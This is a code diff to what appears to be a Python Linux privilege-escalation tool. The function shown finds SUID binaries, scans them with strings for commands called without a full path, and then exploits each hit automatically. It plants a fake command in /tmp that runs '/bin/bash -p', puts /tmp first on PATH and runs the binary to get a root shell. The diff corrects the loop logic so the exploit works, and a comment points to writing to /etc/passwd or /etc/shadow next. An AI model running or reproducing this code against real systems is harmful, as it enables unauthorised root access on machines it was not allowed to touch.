@@ -425,27 +425,26 @@ def path():
 
    os.system("mkdir /tmp/.path/")
    os.system("echo '### the following are possible undefined $PATH binary vulnerabilities ###' > /tmp/path_res.txt")
-   os.system("find / -type f -perm /4000 2>/dev/null > /tmp/path.txt")
+   os.system("find / -type f -perm /4000 2>/dev/null | tee /tmp/path.txt")
    print("\n### finding SUID executables that don't specify full path (for $PATH exploit) ###")
    with open("/tmp/path.txt") as root_files:
       lines = root_files.readlines()
       for line in lines:
-         line_path = line
          split_path = line.split("/")
          split_path_1 = split_path[-1].strip()
          os.system("strings {} > /tmp/.path/root_{}".format(line,split_path_1))
-   with open("/tmp/.path/root_{}".format(split_path_1)) as strings_file:
-      lines_strings = strings_file.readlines()
-      for line in lines_strings:
-         for cmd in common_cmds:
-            non_path_cmd = re.search("\s{}\s".format(cmd), str(line))
-            if non_path_cmd:
-               print("### {} binary does not specify full path of {} ###".format(split_path_1,cmd))
-               os.system("echo '### {} does not specify full path of {} ###' >> /tmp/path_res.txt".format(split_path_1,cmd))
-               os.system("touch /tmp/{}&&echo '/bin/bash -p' > /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line_path))
-               break
-            else:
-               continue
+         with open("/tmp/.path/root_{}".format(split_path_1)) as strings_file:
+            lines_strings = strings_file.readlines()
+            for item in lines_strings:
+               for cmd in common_cmds:
+                  non_path_cmd = re.search("\s{}\s".format(cmd), str(item))
+                  if non_path_cmd:
+                     print("### {} does not specify full path of {} ###".format(line,cmd))
+                     os.system("echo '### {} does not specify full path of {} ###' >> /tmp/path_res.txt".format(line,cmd))
+                     os.system("touch /tmp/{}&&echo '#!/bin/bash' > /tmp/{}&&echo '/bin/bash -p' >> /tmp/{}&&chmod +x /tmp/{}&&export PATH=/tmp:$PATH&&.{}".format(cmd,cmd,cmd,line))
+                     break
+                  else:
+                     continue
 
 
 # try writing to /etc/passwd or /etc/shadow
